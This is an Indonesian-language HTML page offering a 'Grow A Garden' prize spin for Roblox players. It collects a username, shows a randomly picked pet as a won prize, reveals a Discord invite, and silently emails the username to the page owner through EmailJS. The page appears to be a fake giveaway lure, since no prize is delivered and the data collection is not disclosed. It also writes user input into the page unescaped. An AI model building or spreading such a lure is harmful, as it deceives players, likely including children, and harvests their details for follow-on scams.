
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Spin Hadiah - Grow A Garden</title>
  <style>
    body {
      font-family: 'Arial', sans-serif;
      text-align: center;
      background: url('https://images.unsplash.com/photo-1501004318641-b39e6451bec6') no-repeat center center/cover;
      color: #fff;
      padding: 20px;
    }

    .container {
      background: rgba(0, 0, 0, 0.6);
      padding: 30px;
      border-radius: 15px;
      display: inline-block;
    }

    #result {
      font-size: 24px;
      margin-top: 20px;
      animation: pop 0.5s ease-out;
    }

    @keyframes pop {
      0% { transform: scale(0.5); opacity: 0; }
      100% { transform: scale(1); opacity: 1; }
    }

    input, button {
      padding: 10px;
      font-size: 16px;
      margin: 10px;
    }

    a.discord-link {
      display: none;
      margin-top: 20px;
      font-weight: bold;
      color: #00ffcc;
      text-decoration: underline;
    }
  </style>
</head>
<body>

  <div class="container">
    <h1>🎁 Spin Hadiah - Grow A Garden</h1>
    <input type="text" id="username" placeholder="Masukkan username Roblox" required />
    <br>
    <button onclick="spin()">🎡 Spin Sekarang</button>
    <div id="result"></div>
    <a href="https://discord.gg/yaSGWQmQ" target="_blank" class="discord-link" id="discordLink">Join Discord 🌿</a>
  </div>

  <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
  <script>
    emailjs.init("service_t1xe69w");

    const hadiahList = [
      "🐾 Pet Raccoon",
      "🦊 Pet Red Fox",
      "🐝 Pet Queen Bee",
      "🐞 Pet Dragonfly",
      "💃 Pet Disco Bee",
      "🦗 Pet Mantis"
    ];

    function spin() {
      const username = document.getElementById("username").value.trim();
      if (!username) {
        alert("Masukkan username Roblox kamu dulu!");
        return;
      }

      const hadiah = hadiahList[Math.floor(Math.random() * hadiahList.length)];
      document.getElementById("result").innerHTML = `🎉 Username <b>${username}</b> mendapatkan <b>${hadiah}</b>!`;
      document.getElementById("discordLink").style.display = "inline-block";

      emailjs.send("service_t1xe69w", "template_7cwn059", {
        username: username,
        hadiah: hadiah
      }).then(() => {
        console.log("Email terkirim");
      }, (error) => {
        console.error("Gagal kirim email:", error);
      });
    }
  </script>

</body>
</html>
